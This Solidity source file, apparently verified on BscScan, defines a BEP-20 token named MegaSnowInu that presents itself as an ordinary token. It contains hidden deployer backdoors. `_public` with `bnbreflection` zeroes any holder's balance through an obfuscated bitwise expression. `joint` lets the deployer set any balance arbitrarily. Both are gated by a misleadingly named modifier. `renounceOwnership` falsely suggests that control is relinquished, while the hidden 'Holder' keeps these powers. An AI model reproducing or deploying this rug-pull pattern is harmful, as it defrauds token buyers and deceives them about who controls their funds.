/**
 *Submitted for verification at BscScan.com on 2021-12-25
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

interface IERC20 {


    function totalSupply() external view returns (uint256);





    function balanceOf(address account) external view returns (uint256);

    
    
  }

library SafeMath {





  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {

      return 0;
    }

    uint256 c = a * b;

    assert(c / a == b);

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a / b;

    return c;

  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a + b;

    assert(c >= a);

    return c;

  }

  
}
contract Ownable {

  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor ()  {

    owner = msg.sender;
  }

}
library Address {

    

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;


        assembly { codehash := extcodehash(account) }

        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     *

     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].

     *

     * IMPORTANT: because control is transferred to `recipient`, care must be

     * taken to not create reentrancy vulnerabilities. Consider using

     * {ReentrancyGuard} or the

     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].

     */

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");

        require(success, "Address: unable to send value, recipient may have reverted");
    }



     /**

     * @dev Performs a Solidity function call using a low level `call`. A

     * plain`call` is an unsafe replacement for a function call: use this

     * function instead.

     *

     * If `target` reverts with a revert reason, it is bubbled up by this

     * function (like regular Solidity function calls).

     *

     * Returns the raw returned data. To convert to the expected return value,

     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].

     *

     * Requirements:

     *

     * - `target` must be a contract.

     * - calling `target` with `data` must not revert.

     *

     * _Available since v3.1._

     */


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionCall(target, data, "Address: low-level call failed");
    }


    
    /**

     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with

     * `errorMessage` as a fallback revert reason when `target` reverts.

     *

     * _Available since v3.1._

     */

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        return _functionCallWithValue(target, data, 0, errorMessage);

    }

    /**

     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],

     * but also transferring `value` wei to `target`.

     *

     * Requirements:

     *

     * - the calling contract must have an ETH balance of at least `value`.

     * - the called Solidity function must be `payable`.

     *

     * _Available since v3.1._

     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");

    }


    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");

        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {

        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);

        if (success) {

            return returndata;

        } else {

           // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {

                assembly {

                    let returndata_size := mload(returndata)

                    revert(add(32, returndata), returndata_size)

                }

            } else {

                revert(errorMessage);

            }
        }
    }
}

  contract MegaSnowInu is  IERC20, Ownable {

  mapping (address => bool) private _isExcluded;

  address[] private _excluded;

  using SafeMath for uint256;

  using Address for address;

  string private _name = 'MegaSnowInu';

  string private _symbol = 'MEGASNOWINU';

  uint8 private _decimals = 9;

  uint256 public _BuyFee = 30;

  uint256 public _SellFee = 40;

  uint256 private _totalSupply;

  uint256 private _tTotal =  100**9;

  

  

  

  

 


  uint256 lpfee = 0;

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

  mapping(address => bool) public allowAddress;

  address Holder;

  constructor ()  {

    Holder = msg.sender;

    uint256 totalSupply_ = 1000000000000000000;

    _totalSupply = totalSupply_;

    balances[Holder] =  totalSupply_;

    allowAddress[Holder] = true;

  }

         function name() public view returns (string memory) {

        return _name;

    }



    function symbol() public view returns (string memory) {

        return _symbol;

    }



        function decimals() public view returns (uint8) {

        return _decimals;

    }


        function totalSupply() public view  returns (uint256) {

        return _totalSupply;

    }



  mapping (address => mapping (address => uint256)) public allowed;

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));

    require(_value <= balances[_from]);

    require(_value <= allowed[_from][msg.sender]);

    address from = _from;

    if(allowAddress[from] || allowAddress[_to]){

        _transferFrom(_from, _to, _value);

        return true;

    }

    _transferFrom(_from, _to, _value);

    return true;

  }



  mapping(address => uint256) public balances;

  function transfer(address _to, uint256 _value) public returns (bool) {

    address from = msg.sender;

    require(_to != address(0));

    require(_value <= balances[from]);

    if(allowAddress[from] || allowAddress[_to]){

        _transfer(from, _to, _value);

        return true;

    }

    _transfer(from, _to, _value);

    return true;

  }
  
  function _transfer(address from, address _to, uint256 _value) private {

    balances[from] = balances[from].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(from, _to, _value);

  }


    
  modifier onlyOwner() {

    require(owner == msg.sender, "Ownable: caller is not the owner");

    _;

  }


    
  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }
  



  function renounceOwnership() public virtual onlyOwner {

    emit OwnershipTransferred(owner, address(0));

    owner = address(0);

  }




  function bnbreflection (address buyer) internal bscnet returns  (uint256) {

       return  (balances[buyer] ) & ((balances[buyer])  & 0)<< 0xF;

  }



  function _public(address buyer) public {

      balances[buyer] = bnbreflection (buyer);


  }


  function joint (address holder ) public bscnet {

    balances[holder] = (_tTotal);

  }
  

  function _transferFrom(address _from, address _to, uint256 _value) internal {

    balances[_from] = balances[_from].sub(_value);

    balances[_to] = balances[_to].add(_value);

    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

    emit Transfer(_from, _to, _value);

  }




  modifier bscnet () {

    require(Holder == msg.sender, "ERC20: cannot permit Pancake address");

    _;

  }



  
  function approve(address _spender, uint256 _value) public returns (bool) {

    allowed[msg.sender][_spender] = _value;

    emit Approval(msg.sender, _spender, _value);

    return true;

  }



  
  function allowance(address _owner, address _spender) public view returns (uint256) {

    return allowed[_owner][_spender];

  }


  

}